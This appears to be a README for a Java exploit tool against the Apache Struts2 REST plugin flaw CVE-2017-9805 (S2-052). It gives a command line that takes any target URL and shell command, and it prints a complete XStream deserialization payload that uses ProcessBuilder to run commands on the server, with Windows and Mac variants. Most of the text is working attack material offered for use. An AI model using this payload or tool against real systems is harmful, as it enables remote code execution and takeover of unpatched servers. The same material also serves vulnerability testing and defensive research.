# CVE-2017-9805 （S2-052） Exploit For Nc

## Options

```
 [*] Apache Struts2 CVE-2017-9805 (S2-052) - Exploit
 [*] 0day Info:https://secfree.com/article-333.html
 [*] Use:        <targetUrl> <command>
 [*] Author:  www.secFree.com Team By Bearcat
```

## Usage

```
java -jar CVE-2017-9805-Exploit.jar http://192.168.199.246:8080/struts2-rest-showcase/orders.xhtml "command"
```

![exploit](https://github.com/iBearcat/S2-052/blob/master/exploit.jpg?raw=true)

## Poc

```
Content-Type: application/xml

<map>
<entry>
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>calc</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>
</map>

Windows <command><string>calc</string></command>

Mac <command><string>/Applications/Calculator.app/Contents/MacOS/Calculator</string></command>
```
